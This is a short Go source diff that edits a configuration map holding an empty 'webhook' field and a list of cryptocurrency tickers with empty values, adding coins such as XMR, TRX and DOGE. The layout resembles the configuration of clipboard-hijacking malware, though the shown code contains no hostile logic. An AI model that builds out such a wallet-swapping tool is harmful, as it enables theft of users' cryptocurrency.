@@ -25,15 +25,17 @@ func main() {
 	CONFIG := map[string]interface{}{
 		"webhook": "",
 		"cryptos": map[string]string{
-			"BTC":  "",
-			"ETH":  "",
-			"MON":  "",
-			"LTC":  "",
-			"XCH":  "",
-			"PCH":  "",
-			"CCH":  "",
-			"ADA":  "",
+			"BTC": "",
+			"BCH": "",
+			"ETH": "",
+			"XMR": "",
+			"LTC": "",
+			"XCH": "",
+			"XLM": "",
+			"TRX": "",
+			"ADA": "",
 			"DASH": "",
+			"DOGE": "",
 		},
 	}
 
